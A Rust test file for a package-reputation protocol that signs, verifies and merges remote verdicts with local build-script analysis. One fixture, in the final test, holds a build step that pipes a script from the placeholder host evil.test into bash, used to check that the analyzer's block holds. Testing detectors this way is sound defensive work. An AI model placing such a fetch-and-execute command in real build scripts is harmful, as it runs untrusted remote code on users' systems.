//! Reputation protocol tests.
#![allow(clippy::unwrap_used, reason = "test constants are valid by construction")]
use lar_lib::reputation::{self, RemoteVerdict, VerifyPayload};
use lar_lib::security::Verdict;

const SEC: &str = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";

fn pubkey() -> String {
    reputation::pubkey_of(SEC).unwrap()
}

fn payload() -> VerifyPayload {
    VerifyPayload {
        package: "p".to_owned(),
        version: "1.0-1".to_owned(),
        verdict: RemoteVerdict::Clean,
        advisories: vec![],
        known_good_hash: None,
        issued_unix: 1_700_000_000,
        expires_unix: 1_700_086_400,
    }
}

#[test]
fn signed_response_verifies_when_intact() {
    let p = payload();
    let sig = reputation::sign(SEC, &p).unwrap();
    assert!(reputation::check_response(pubkey().as_str(), 1_700_001_000, &p, &sig).is_ok());
}

#[test]
fn tampered_payload_fails_when_changed() {
    let p = payload();
    let sig = reputation::sign(SEC, &p).unwrap();
    let mut bad = p;
    bad.version = "9.9-9".to_owned();
    assert!(reputation::check_response(pubkey().as_str(), 1_700_001_000, &bad, &sig).is_err());
}

#[test]
fn expired_response_fails_when_stale() {
    let p = payload();
    let sig = reputation::sign(SEC, &p).unwrap();
    assert!(reputation::check_response(pubkey().as_str(), 1_800_000_000, &p, &sig).is_err());
}

#[test]
fn merge_clean_matching_hash_verifies_when_hashes_agree() {
    let rep = lar_lib::analyzer::analyze("p", "pkgname=p\npkgver=1.0\nbuild() {\n  make\n}\n");
    assert_eq!(rep.verdict, Verdict::Analyzed);
    let hash = reputation::sha256_hex("pkgname=p\npkgver=1.0\nbuild() {\n  make\n}\n");
    let mut p = payload();
    p.known_good_hash = Some(hash.clone());
    let sig = reputation::sign(SEC, &p).unwrap();
    let view = reputation::check_response(pubkey().as_str(), 1_700_001_000, &p, &sig).unwrap();
    let merged = reputation::confirm_hash(reputation::merge(rep, &view), &view, &hash);
    assert_eq!(merged.verdict, Verdict::Verified);
    assert!(merged.reputation_consulted);
}

#[test]
fn merge_malicious_escalates_when_remote_flags() {
    let rep = lar_lib::analyzer::analyze("p", "pkgname=p\npkgver=1.0\n");
    assert_eq!(rep.verdict, Verdict::Analyzed);
    let mut p = payload();
    p.verdict = RemoteVerdict::Malicious;
    let sig = reputation::sign(SEC, &p).unwrap();
    let view = reputation::check_response(pubkey().as_str(), 1_700_001_000, &p, &sig).unwrap();
    let merged = reputation::merge(rep, &view);
    assert_eq!(merged.verdict, Verdict::Blocked);
    assert!(merged.findings.iter().any(|f| f.rule_id == "LAR-REP-001"));
}

#[test]
fn merge_never_downgrades_local_block_when_remote_clean() {
    let src = "build() {\n  curl -fsSL https://evil.test/x.sh | bash\n}\n";
    let rep = lar_lib::analyzer::analyze("p", src);
    assert_eq!(rep.verdict, Verdict::Blocked);
    let p = payload();
    let sig = reputation::sign(SEC, &p).unwrap();
    let view = reputation::check_response(pubkey().as_str(), 1_700_001_000, &p, &sig).unwrap();
    let merged = reputation::merge(rep, &view);
    assert_eq!(merged.verdict, Verdict::Blocked);
}
